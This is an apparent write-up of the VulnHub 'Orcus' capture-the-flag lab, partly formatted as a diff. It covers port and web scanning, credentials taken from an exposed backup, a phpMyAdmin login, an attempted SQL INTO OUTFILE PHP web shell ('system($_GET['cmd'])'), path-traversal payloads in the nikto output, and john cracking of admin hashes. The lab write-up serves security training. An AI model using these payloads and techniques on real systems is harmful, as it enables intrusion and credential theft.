</div><div>define("DB_HOST","localhost");</div><div><br/></div><div>[...]</div></div><div><br/></div><div>Additionally, the adem.sql file defines a default password for settings.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Orcus:/var/www/html/Adem# cat adem.sql</div><div>[...]</div><div>INSERT INTO `settings` (`sid`, `sett_name`, `sett_value`) VALUES</div><div>(1, 'site_url', 'ضع رابط موقع هنا . - put your website url here'),</div><div>(2, 'site_name', ''),</div><div>(3, 'site_descrip', ''),</div><div>(4, 'google_code', ''),</div><div>(5, 'email', ''),</div><div>(6, 'password', '8a8e83876e81242bee8a620b2967dc33'),</div><div>(9, 'site_keywords', ''),</div><div>(8, 'visits', ''),</div><div>(7, 'last_login', ''),</div><div>(10, 'theme_name', 'default');</div><div>[...]</div></div><div><br/></div><div>Looking at the ad-user.php file, it appears that passwords are double md5 encoded before being checked against the database.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Orcus:/var/www/html/Adem# cat ad-user.php</div><div>[...]</div><div>                if(isset($_POST['password'])){</div><div>                    $return = [];</div><div>                    if(!empty($_POST['password'])){</div><div>                        $post_password = clearPOST($_POST['password']);</div><div>                        $passINDB = $loginDB-&gt;getSettingVal("password");</div><div>                        $passwordMD5 = md5(md5($post_password));</div><div><div><br/></div><div><br/></div></div><div>                        if($passwordMD5 == $passINDB){</div><div>[...]</div></div><div><br/></div><div>I decided to submit this hash to the MD5 Cracker Page here <a href="https://hashkiller.co.uk/Cracker/MD5" target="_blank">https://hashkiller.co.uk/Cracker/MD5</a> and got a result... though not a surprising one.</div><div><br/></div><div><img height="134" src="/assets/images/2019-04-15-hackfest2016-orcus/8E702539-C9E5-44C9-8800-734B3DD25D7F.png" width="964"/><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-orcus,182/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-orcus,182/</a></div>
+<div>Hostname: orcus</div>
+<div>IP Address: 10.183.0.220</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.220.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# nmap -Pn -sT -sV -A -p 1-65535 -oA orcus 10.183.0.220</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-16 11:24 EDT</div>
+    <div>Nmap scan report for Orcus.homenet.dom (10.183.0.220)</div>
+    <div>Host is up (0.0033s latency).</div>
+    <div>Not shown: 65519 closed ports</div>
+    <div>PORT      STATE SERVICE     VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey:</div>
+    <div>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)</div>
+    <div>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)</div>
+    <div>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)</font>
+    </div>
+    <div>| dns-nsid:</div>
+    <div>|_  bind.version: 9.10.3-P4-Ubuntu</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))</font>
+    </div>
+    <div>| http-robots.txt: 30 disallowed entries (15 shown)</div>
+    <div>| /exponent.js.php /exponent.js2.php /exponent.php</div>
+    <div>| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php</div>
+    <div>| /exponent_version.php /getswversion.php /login.php /overrides.php</div>
+    <div>| /popup.php /selector.php /site_rss.php /source_selector.php</div>
+    <div>|_/thumb.php</div>
+    <div>|_http-server-header: Apache/2.4.18 (Ubuntu) </div>
+    <div>|_http-title: Site doesn't have a title (text/html).</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp   open  pop3        Dovecot pop3d</font>
+    </div>
+    <div>|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE SASL RESP-CODES STLS TOP</div>
+    <div>|_ssl-date: TLS randomness does not represent time</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind     2-4 (RPC #100000)</font>
+    </div>
+    <div>| rpcinfo:</div>
+    <div>|   program version   port/proto  service</div>
+    <div>|   100000  2,3,4        111/tcp  rpcbind</div>
+    <div>
+        <div>|   100000  2,3,4        111/udp  rpcbind</div>
+        <div>|   100003  2,3,4       2049/tcp  nfs</div>
+        <div>|   100003  2,3,4       2049/udp  nfs</div>
+        <div>|   100005  1,2,3      46869/udp  mountd</div>
+        <div>|   100005  1,2,3      52432/tcp  mountd</div>
+        <div>|   100021  1,3,4      42413/tcp  nlockmgr   </div>
+        <div>|   100021  1,3,4      48272/udp  nlockmgr   </div>
+        <div>|   100227  2,3         2049/tcp  nfs_acl</div>
+        <div>|_  100227  2,3         2049/udp  nfs_acl</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp   open  imap        Dovecot imapd</font>
+        </div>
+        <div>|_imap-capabilities: STARTTLS more OK Pre-login IDLE have LOGINDISABLEDA0001 listed LITERAL+ ENABLE post-login capabilities ID IMAP4rev1 LOGIN-REFERRALS SASL-IR</div>
+        <div>|_ssl-date: TLS randomness does not represent time</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</font>
+        </div>
+        <div>| ssh-hostkey:</div>
+        <div>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)</div>
+        <div>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)</div>
+        <div>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp   open  ssl/imaps?</font>
+        </div>
+        <div>|_ssl-date: TLS randomness does not represent time</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp   open  ssl/pop3s?</font>
+        </div>
+        <div>|_ssl-date: TLS randomness does not represent time</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">2049/tcp  open  nfs_acl     2-3 (RPC #100227)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">42413/tcp open  nlockmgr    1-4 (RPC #100021)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">44598/tcp open  mountd      1-3 (RPC #100005)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">46296/tcp open  mountd      1-3 (RPC #100005)</font>
+        </div>
+        <div>
+            <div>
+                <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">52432/tcp open  mountd      1-3 (RPC #100005)</font>
+            </div>
+            <div>MAC Address: 08:00:27:96:F8:7B (Oracle VirtualBox virtual NIC)</div>
+            <div>Device type: general purpose</div>
+            <div>Running: Linux 3.X|4.X</div>
+            <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+            <div>OS details: Linux 3.2 - 4.9</div>
+            <div>Network Distance: 1 hop</div>
+            <div>Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+            <div>
+                <div><br /></div>
+                <div><br /></div>
+            </div>
+            <div>Host script results:</div>
+            <div>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s</div>
+            <div>|_nbstat: NetBIOS name: ORCUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
+            <div>| smb-os-discovery:</div>
+            <div>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</div>
+            <div>|   Computer name: orcus</div>
+            <div>|   NetBIOS computer name: ORCUS\x00</div>
+            <div>|   Domain name: homenet.dom</div>
+            <div>|   FQDN: orcus.homenet.dom</div>
+            <div>|_  System time: 2019-04-16T11:25:14-04:00   </div>
+            <div>| smb-security-mode:</div>
+            <div>|   account_used: guest</div>
+            <div>|   authentication_level: user</div>
+            <div>|   challenge_response: supported</div>
+            <div>|_  message_signing: disabled (dangerous, but default)</div>
+            <div>| smb2-security-mode:</div>
+            <div>|   2.02:</div>
+            <div>|_    Message signing enabled but not required</div>
+            <div>| smb2-time:</div>
+            <div>|   date: 2019-04-16 11:25:14</div>
+            <div>|_  start_date: N/A</div>
+            <div>
+                <div><br /></div>
+                <div><br /></div>
+            </div>
+            <div>TRACEROUTE</div>
+            <div>HOP RTT     ADDRESS</div>
+            <div>1   3.33 ms Orcus.homenet.dom (10.183.0.220) </div>
+            <div>
+                <div><br /></div>
+                <div><br /></div>
+            </div>
+            <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+            <div>Nmap done: 1 IP address (1 host up) scanned in 249.71 seconds</div>
+        </div>
+    </div>
+</div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Ran nikto against the HTTP service on TCP port 80.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# nikto -h http://10.183.0.220</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.220</div>
+    <div>+ Target Hostname:    10.183.0.220</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-04-16 11:57:51 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t</div>
+    <div>ype</div>
+    <div>+ Cookie PHPSESSID created without the httponly flag</div>
+    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+    <div>+ Entry '/exponent.js.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/exponent.js2.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/exponent.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/exponent_bootstrap.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/exponent_constants.php' in robots.txt returned a non-forbidden or redirect HTTP code (500)</div>
+    <div>+ Entry '/exponent_php_setup.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/exponent_version.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/getswversion.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/login.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div>
+    <div>+ Entry '/overrides.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/site_rss.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div>
+    <div>+ Entry '/source_selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/thumb.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div>
+    <div>+ Entry '/ABOUT.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/CHANGELOG.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/CREDITS.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/INSTALLATION.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/README.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/RELEASE.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/TODO.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>
+        <div>+ OSVDB-3268: /files/: Directory indexing found.</div>
+        <div>+ Entry '/files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+        <div>+ OSVDB-3268: /tmp/: Directory indexing found.</div>
+        <div>+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+        <div>+ "robots.txt" contains 30 entries which should be manually viewed.</div>
+        <div>+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53ff6086e56aa, mtime: gzip</div>
+        <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+        <div>+ Multiple index files found: /index.html, /index.php</div>
+        <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</div>
+        <div>+ OSVDB-2870: /index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server.</div>
+        <div>+ OSVDB-59085: /index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.</div>
+        <div>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)</div>
+        <div>+ OSVDB-59085: /index.php?l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.</div>
+        <div>+ OSVDB-8193: /index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd: EW FileManager for PostNuke allows arbitrary file retrieval.</div>
+        <div>+ OSVDB-3092: /admin/: This might be interesting...</div>
+        <div>+ OSVDB-3092: /files/: This might be interesting...</div>
+        <div>+ Uncommon header 'x-ob_mode' found, with contents: 1</div>
+        <div>+ OSVDB-3092: /tmp/: This might be interesting...</div>
+        <div>+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.</div>
+        <div>+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.</div>
+        <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+        <div>+ OSVDB-3092: /test.php: This might be interesting...</div>
+        <div>+ <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">/phpmyadmin/</font>: phpMyAdmin directory found   </div>
+        <div>+ 9718 requests: 0 error(s) and 48 item(s) reported on remote host</div>
+        <div>+ End Time:           2019-04-16 11:59:17 (GMT-4) (86 seconds)</div>
+        <div>---------------------------------------------------------------------------</div>
+        <div>+ 1 host(s) tested</div>
+    </div>
+</div>
+<div><br /></div>
+<div>Checked several of the paths returned from nikto with 200 responses. From the following URLs (among others), I can tell the server is using the Exponent Content Management System (version <span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; overflow-wrap: break-word; white-space: pre-wrap; color: rgb(0, 0, 0); font-variant-caps: normal; font-variant-ligatures: normal;">2.3.9).</span></div>
+<div><br /></div>
+<div><a href="http://10.183.0.220/CHANGELOG.md" style="--inversion-type-color:  simple;">http://10.183.0.220/CHANGELOG.md</a></div>
+<div><a href="http://10.183.0.220/getswversion.php">http://10.183.0.220/getswversion.php</a></div>
+<div><a href="http://10.183.0.220/install/changes/">http://10.183.0.220/install/changes/</a></div>
+<div><br /></div>
+<div>The exploit database reports a Blind SQL Injection vulnerability for this version of Exponent CMS.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Exponent CMS 2.3.9 - Blind SQL Injection                                                                     | exploits/php/webapps/40412.txt</div>
+</div>
+<div><br /></div>
+<div>This would be great, but browsing to /index.php reveals the database for Exponent is "Off-line". You can't do SQL injection on a database that isn't available. 😞</div>
+<div><br /></div>
+<div><img height="338" src="/assets/images/2019-04-15-hackfest2016-orcus/E875520C-EB77-4376-A0F9-1FC7AE9043E7.png" width="1878" /><br /></div>
+<div><br /></div>
+<div>The /external path is listable and contains many applications, several of which have known vulnerabilities. Unfortunately, many aren't set up or at least aren't clearly accessible (since Exponent isn't really running).</div>
+<div><br /></div>
+<div><img height="1426" src="/assets/images/2019-04-15-hackfest2016-orcus/05750D69-D2BF-4B6E-97A5-66AFB288E471.png" width="1032" /><br /></div>
+<div><br /></div>
+<div>I use wget to mirror the /external directory so I can search for .php files that might return content. While that started downloading, I took note of the 'adminer' directory.</div>
+<div><br /></div>
+<div><img height="726" src="/assets/images/2019-04-15-hackfest2016-orcus/F17CCAD4-7E0D-40CE-8F96-30DA4B82B260.png" width="908" /><br /></div>
+<div><br /></div>
+<div>The 'admin.php' file only returns a page saying I need to be logged in to Exponent. The 'adminer-4.2.5-mysql.php', however, gives me a login page to manage the backend database.</div>
+<div><br /></div>
+<div><img height="704" src="/assets/images/2019-04-15-hackfest2016-orcus/7E632B77-EC04-447C-A262-7D68CCA2A92B.png" width="1112" /><br /></div>
+<div><br /></div>
+<div>Nikto also reported the server has phpMyAdmin available at /phpmyadmin.</div>
+<div><br /></div>
+<div><img height="1024" src="/assets/images/2019-04-15-hackfest2016-orcus/9254CC86-6393-4BE8-8121-437F578BB05A.png" width="800" /><br /></div>
+<div><br /></div>
+<div>Except for these login interfaces to manage the database, most of what nikto reported seems to be a dead end. Let's run dirb to see if there are any other sites hosted on the server that might provide a way in.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>dirb http://10.183.0.220 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.220.txt</div>
+</div>
+<div><br /></div>
+<div>Stepping through each directory found by dirb...</div>
+<div><br /></div>
+<div>The /admin directory doesn't return anything; however, the /backups directory is listable and has a couple of files.</div>
+<div><br /></div>
+<div><img height="458" src="/assets/images/2019-04-15-hackfest2016-orcus/649CF1B2-9D67-4690-A277-7BC9509EB29D.png" width="988" /><br /></div>
+<div><br /></div>
+<div>Backups are notorious for containing sensitive information from files in locations that typically wouldn't be accessible remotely. Let's see what we've got.</div>
+<div><br /></div>
+<div>Unfortunately, access to the 'ssh-creds.bak' file is "Forbidden". That would be too easy.</div>
+<div><br /></div>
+<div>However, downloading and browsing through the 'SimplePHPQuiz-Backupz.tar.gz' archive, we've found some database credentials.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# wget "http://10.183.0.220/backups/SimplePHPQuiz-Backupz.tar.gz"</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# tar zxf SimplePHPQuiz-Backupz.tar.gz </div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# cd SimplePHPQuiz/</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus/SimplePHPQuiz# grep -ri 'password' * | cut -d ':' -f 1 | sort -u</div>
+    <div>css/bootstrap.css.map</div>
+    <div>includes/db_conn.php</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus/SimplePHPQuiz# cat includes/db_conn.php</div>
+    <div>&lt;?php </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>//Set the database access information as constants</div>
+    <div>DEFINE ('DB_USER', 'dbuser');</div>
+    <div>DEFINE ('DB_PASSWORD', 'dbpassword');</div>
+    <div>DEFINE ('DB_HOST', 'localhost');</div>
+    <div>DEFINE ('DB_NAME', 'quizdb');</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>if (mysqli_connect_error()){</div>
+    <div>        echo "Could not connect to MySql. Please try again";</div>
+    <div>        exit();</div>
+    <div>}</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>?&gt;</div>
+</div>
+<div><br /></div>
+<div>Now that we have some database credentials, let's go try them on the phpMyAdmin login page.</div>
+<div><br /></div>
+<div><img height="1454" src="/assets/images/2019-04-15-hackfest2016-orcus/C53D1CF9-E1C1-4711-BEB2-279F527FE170.png" width="2660" /><br /></div>
+<div><br /></div>
+<div>They worked! :]</div>
+<div><br /></div>
+<div>Looks like we are running<font face="Helvetica Neue" style="font-size: 14px;"> phpM<font>yAdmin version <span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(243, 243, 243); color: rgb(68, 68, 68); font-variant-caps: normal; font-variant-ligatures: normal;">4.5.4.1deb2ubuntu2. Let's </span></font><span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(243, 243, 243); color: rgb(68, 68, 68); font-variant-caps: normal; font-variant-ligatures: normal;">check the exploit database for known vulnerabilities. Surprisingly, nothing for version 4.5.</span></font>
+</div>
+<div><br /></div>
+<div>Browsing to the 'mysql/user' table, we see that our 'dbuser' account has all the permissions we'll ever need, so no need to try to brute force any of the other accounts.</div>
+<div><br /></div>
+<div><img height="546" src="/assets/images/2019-04-15-hackfest2016-orcus/3682E5A9-CCA5-4158-A2D8-38E02B9D6967.png" width="2166" /><br /></div>
+<div><br /></div>
+<div>Let's see if we can use/abuse phpMyAdmin to upload some PHP code that will allow us to execute arbitrary commands on the server. We'll assume the server is hosting files out of the default '/var/www/html' directory. We select first database in the list (Adem) and go to the SQL tab to run our sql command. We are going to try to create a 'cmd.php' file in the root of /var/www/html that has PHP code that takes a query string parameter called 'cmd' and executes it on the server.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE "/var/www/html/cmd.php"</div>
+</div>
+<div><br /></div>
+<div><img height="1046" src="/assets/images/2019-04-15-hackfest2016-orcus/9BF689B0-AA79-4B02-A056-911CE76BF572.png" width="2656" /><br /></div>
+<div><br /></div>
+<div>After hitting Go, we get an error. Looks like the MySQL server has been properly configured to only allow files to be written to a well defined location.</div>
+<div><br /></div>
+<div><img height="452" src="/assets/images/2019-04-15-hackfest2016-orcus/17AF592D-410C-44BB-954D-5F430E600C5A.png" width="1420" /><br /></div>
+<div><br /></div>
+<div>I run the following command to see what the secure location is.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>SHOW VARIABLES LIKE "secure_file_priv";</div>
+</div>
+<div><br /></div>
+<div><img height="106" src="/assets/images/2019-04-15-hackfest2016-orcus/4A7C89A8-65DE-45CB-8C45-DC2A6650DEB2.png" width="464" /><br /></div>
+<div><br /></div>
+<div>Well, so much for that. It is doubtful the web server can access any files written to '/var/lib/mysql-files'. Moving on...</div>
+<div><br /></div>
+<div>Most of the other databases seem to be empty. The only one that has content is 'zencart'.</div>
+<div><br /></div>
+<div>The 'admin' table in the zencart database has a user named 'admin' with a current password hash and a previous password hash. Let's try to crack the hashes with john.</div>
+<div><br /></div>
+<div><img height="112" src="/assets/images/2019-04-15-hackfest2016-orcus/949C3BB7-1216-4FC0-90EE-4C0F7C30FA2E.png" width="2166" /><br /></div>
+<div><br /></div>
+<div>I create a file with the two hashes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# cat zencart-admin </div>
+    <div>admin:$2y$10$W7Leeizto5Pc9tXCVlEgFOlcbjHeaOPoUsRqwl4xmTzhrKR52vDf.</div>
+    <div>admin_old:$2y$10$P7YrX.VgZXRkFI/990aQnencu8IxU5B2l/O6Zqo.xVU832f4Ykesm</div>
+</div>
+<div><br /></div>
+<div>I use john to crack them.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# john --single zencart-admin</div>
+    <div>Using default input encoding: UTF-8</div>
+    <div>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])</div>
+    <div>admin123         (admin)</div>
+    <div>1g 0:00:05:33 DONE (2019-04-16 13:28) 0.002999g/s 37.77p/s 37.78c/s 37.78C/s old1900..oadmin1900</div>
+    <div>Use the "--show" option to display all of the cracked passwords reliably</div>
+    <div>Session completed</div>
+</div>
+<div><br /></div>
+<div>Looks like the current password was cracked (using the most basic cracking method --single), but not the previous one. I tried to SSH to the host using 'root:admin123' and 'admin:admin123'. Neither worked, but it was worth a shot. The server also doesn't seem to have a /zencart directory, so maybe this is just a red herring. We'll see if this password can be used somewhere else later.</div>
+<div><br /></div>
+<div>Now, back to stepping through the found directories...</div>
+<div><br /></div>
